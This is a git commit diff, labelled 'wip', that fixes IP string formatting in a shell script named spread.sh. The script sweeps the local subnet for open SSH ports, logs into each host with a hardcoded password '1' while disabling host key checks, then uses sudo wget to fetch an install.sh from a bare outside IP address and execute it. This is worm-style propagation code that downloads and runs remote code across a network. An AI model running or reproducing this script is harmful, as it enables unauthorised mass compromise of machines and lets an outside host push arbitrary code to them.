d7c2f1411ef18d97d67c589bd51e5ccec4779e07
nitrogen <liquid.nitrogenium@gmail.com>
2022-11-01 01:02:09 +0500

    wip

--- public/spread.sh
+++ public/spread.sh
@@ -4,13 +4,13 @@ base_ip=$(hostname -I | cut -d"." -f1-3)
 
      for i in {1..254..1}
         do
-          if nc -w 1 -zv $base_ip$i 22 &>> /dev/null
+          if nc -w 1 -zv $base_ip.$i 22 &>> /dev/null
           then
-            echo "Processing $base_ip$i  ================  \n"
-            sshpass -p1 ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no user@$base_ip$i "cd /usr/bin/ && sudo wget -O install.sh http://95.217.211.87:8000/install.sh && sudo chmod +x install.sh && sudo ./install.sh"
+            echo "Processing $base_ip.$i  ================  \n"
+            sshpass -p1 ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no user@$base_ip.$i "cd /usr/bin/ && sudo wget -O install.sh http://95.217.211.87:8000/install.sh && sudo chmod +x install.sh && sudo ./install.sh"
             sleep 5
           else
-            echo "Empty $base_ip$i"
+            echo "Empty $base_ip.$i"
           fi
      done
 
